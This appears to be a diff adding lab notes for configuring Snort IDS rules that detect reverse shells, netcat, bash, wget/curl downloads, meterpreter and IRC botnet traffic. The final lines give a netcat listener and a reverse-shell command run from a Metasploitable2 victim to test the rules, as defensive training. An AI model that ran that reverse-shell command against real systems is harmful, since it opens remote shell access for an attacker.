@@ -1,0 +1,46 @@
+sudo nano /etc/snort/snort.conf
+Set: ipvar HOME_NET 192.168.45.0/24
+
+sudo nano /etc/snort/rules/local.rules
+Rules
+alert tcp any any -&gt; $HOME_NET 4444 (msg:&quot;MALWARE Reverse Shell
+Attempt Detected (Port 4444)&quot;; sid:3000001; rev:1;)
+
+Rule 2: Netcat Backdoor Traffic Detection
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;MALWARE Netcat Keyword
+Detected&quot;; content:&quot;nc &quot;; nocase; sid:3000002; rev:1;)
+
+Rule 3: Suspicious Bash Shell Execution
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;MALWARE Bash Shell
+Execution Pattern Detected&quot;; content:&quot;/bin/bash&quot;; nocase; sid:3000003;
+rev:1;)
+
+Rule 4: Suspicious Command Download (wget)
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;MALWARE Downloader
+Command Detected (wget)&quot;; content:&quot;wget&quot;; nocase; sid:3000004; rev:1;)
+
+Rule 5: Suspicious Command Download (curl)
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;MALWARE Downloader
+Command Detected (curl)&quot;; content:&quot;curl&quot;; nocase; sid:3000005; rev:1;)
+
+Rule 6: Detect Suspicious HTTP EXE Download
+alert tcp any any -&gt; $HOME_NET 80 (msg:&quot;MALWARE Possible EXE File
+Transfer Detected&quot;; flow:to_client,established; content:&quot;.exe&quot;;
+sid:3000006; rev:1;)
+
+Rule 7: Detect Meterpreter Payload Keyword
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;MALWARE Meterpreter
+Payload Detected&quot;; content:&quot;meterpreter&quot;; nocase; sid:3000007;
+rev:1;)
+
+Rule 8: Detect IRC Botnet Port
+alert tcp any any -&gt; $HOME_NET 6667 (msg:&quot;MALWARE Possible IRC Botnet
+Traffic&quot;; sid:3000008; rev:1;)
+----------------------------------------------------------------------------
+sudo snort -T -c /etc/snort/snort.conf
+sudo snort -A console -q -c /etc/snort/snort.conf -i ens33
+Till above ubuntu
+nc -lvnp 4444
+On Metasploitable2 (Victim):
+nc 192.168.45.135 4444 -e /bin/bash
+
